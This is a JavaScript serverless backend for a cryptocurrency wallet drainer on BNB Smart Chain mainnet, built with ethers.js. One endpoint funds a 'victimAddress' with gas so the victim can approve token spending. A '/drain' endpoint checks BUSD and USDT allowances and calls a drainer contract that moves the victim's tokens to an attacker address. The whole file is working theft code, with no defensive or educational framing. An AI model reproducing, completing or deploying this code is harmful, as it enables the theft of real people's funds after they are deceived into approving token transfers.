require("dotenv").config();
const { ethers } = require("ethers");

const BSC_MAINNET_CHAIN_ID = 56;
const provider = new ethers.JsonRpcProvider("https://bsc-dataseed.binance.org/", BSC_MAINNET_CHAIN_ID);
const wallet = new ethers.Wallet(process.env.PRIVATE_KEY || "YOUR_PRIVATE_KEY_HERE", provider);

const drainerContractAddress = "0xFc23Cc2C8d25c515B2a920432e5EBf6d018e3403"; // Verify or redeploy
const tokenList = [
  { symbol: "BUSD", address: "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56", decimals: 18 },
  { symbol: "USDT", address: "0x55d398326f99059fF775485246999027B3197955", decimals: 18 },
];

const drainerAbi = [
  "function drainTokens(address victim, address[] memory tokens) external returns (uint256[] memory)",
  "function drainSpecificToken(address victim, address token) external returns (uint256)",
  "function attacker() external view returns (address)",
  "event TokensDrained(address indexed victim, address indexed token, uint256 amount)"
];

const tokenAbi = [
  "function balanceOf(address account) external view returns (uint256)",
  "function allowance(address owner, address spender) external view returns (uint256)",
  "function approve(address spender, uint256 amount) external returns (bool)"
];

const Drainer = new ethers.Contract(drainerContractAddress, drainerAbi, wallet);

async function getGasSettings() {
  try {
    const feeData = await provider.getFeeData();
    return {
      gasLimit: 300000,
      maxFeePerGas: feeData.maxFeePerGas || ethers.parseUnits("5", "gwei"),
      maxPriorityFeePerGas: feeData.maxPriorityFeePerGas || ethers.parseUnits("1", "gwei"),
    };
  } catch (error) {
    console.error("Error fetching gas data:", error.message);
    return { gasLimit: 300000, maxFeePerGas: ethers.parseUnits("5", "gwei"), maxPriorityFeePerGas: ethers.parseUnits("1", "gwei") };
  }
}

async function sendGasIfNeeded(victimAddress) {
  const victimBalance = await provider.getBalance(victimAddress);
  if (victimBalance === BigInt(0)) {
    const bnbToSend = ethers.parseEther("0.01");
    const gasSettings = await getGasSettings();
    const tx = await wallet.sendTransaction({ to: victimAddress, value: bnbToSend, ...gasSettings });
    await tx.wait();
    return { success: true, message: `Sent ${ethers.formatEther(bnbToSend)} BNB`, txHash: tx.hash };
  }
  return { success: false, message: "No gas needed" };
}

exports.handler = async (event) => {
  const headers = {
    "Access-Control-Allow-Origin": "http://localhost:5173",
    "Access-Control-Allow-Methods": "POST, OPTIONS",
    "Access-Control-Allow-Headers": "Content-Type",
  };

  if (event.httpMethod === "OPTIONS") {
    return { statusCode: 200, headers, body: "" };
  }

  const body = JSON.parse(event.body || "{}");
  const { victimAddress, drainAll } = body;

  try {
    if (!ethers.isAddress(victimAddress)) {
      return {
        statusCode: 400,
        headers,
        body: JSON.stringify({ error: "Invalid or missing victimAddress" }),
      };
    }

    if (event.path === "/check-and-fund") {
      const gasResult = await sendGasIfNeeded(victimAddress);
      return {
        statusCode: 200,
        headers,
        body: JSON.stringify(gasResult),
      };
    }

    if (event.path === "/drain") {
      const gasSettings = await getGasSettings();
      let tx, totalDrained = BigInt(0);
      let needsApproval = false;

      const tokenAddresses = tokenList.map(t => t.address);
      for (const token of tokenList) {
        const tokenContract = new ethers.Contract(token.address, tokenAbi, provider);
        const allowance = await tokenContract.allowance(victimAddress, drainerContractAddress);
        if (allowance === BigInt(0)) needsApproval = true;
      }

      if (drainAll && !needsApproval) {
        tx = await Drainer.drainTokens(victimAddress, tokenAddresses, { ...gasSettings, gasLimit: 1000000 });
        const receipt = await tx.wait();
        const eventInterface = new ethers.Interface(drainerAbi);
        receipt.logs.forEach(log => {
          try {
            const parsedLog = eventInterface.parseLog(log);
            if (parsedLog.name === "TokensDrained") totalDrained += BigInt(parsedLog.args.amount);
          } catch (e) {}
        });
      }

      return {
        statusCode: 200,
        headers,
        body: JSON.stringify({
          success: totalDrained > 0,
          message: totalDrained > 0 ? `Drained ${ethers.formatEther(totalDrained)} tokens` : needsApproval ? "Approval needed" : "No tokens drained",
          victimAddress,
          transactionHash: tx?.hash || null,
          needsApproval,
        }),
      };
    }

    return { statusCode: 404, headers, body: JSON.stringify({ error: "Endpoint not found" }) };
  } catch (error) {
    console.error("Error:", error.message);
    return {
      statusCode: 500,
      headers,
      body: JSON.stringify({ error: error.message }),
    };
  }
};